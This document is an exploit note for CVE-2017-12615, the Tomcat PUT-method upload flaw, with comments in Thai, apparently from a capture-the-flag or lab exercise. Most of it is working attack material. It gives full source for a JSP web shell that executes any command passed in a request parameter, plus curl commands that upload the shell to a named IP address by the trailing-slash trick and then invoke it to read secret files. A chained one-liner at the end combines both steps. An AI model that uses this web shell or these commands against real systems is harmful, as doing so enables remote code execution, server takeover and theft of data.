# CVE-2017-12615 - Tomcat - PUT Method

shell.jsp

<%@ page import="java.util.*,[java.io](http://java.io/).*" %>
<%
if(request.getParameter("cmd") != null) {
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) {
out.println(line);
}
br.close();
}
%>

# 1. อัปโหลดด้วย slash ท้ายจริง ๆ (ต้องใส่ --path-as-is)

curl --path-as-is -X PUT --data-binary @shell.jsp "[http://34.124.149.106:8080/examples/pwn.jsp/](http://34.124.149.106:8080/examples/pwn.jsp/)" -v

# 2. เรียกใช้ (ไม่มี slash ท้ายแล้ว เพราะ Tomcat ตัดให้)

curl "[http://34.124.149.106:8080/examples/pwn.jsp?cmd=cat /tmp/secret_*.txt](http://34.124.149.106:8080/examples/pwn.jsp?cmd=cat%20/tmp/secret_*.txt)"

curl --path-as-is -X PUT --data-binary @shell.jsp "[http://34.124.149.106:8080/examples/pwn.jsp/](http://34.124.149.106:8080/examples/pwn.jsp/)" && curl "[http://34.124.149.106:8080/examples/pwn.jsp?cmd=cat /tmp/secret_*.txt](http://34.124.149.106:8080/examples/pwn.jsp?cmd=cat%20/tmp/secret_*.txt)"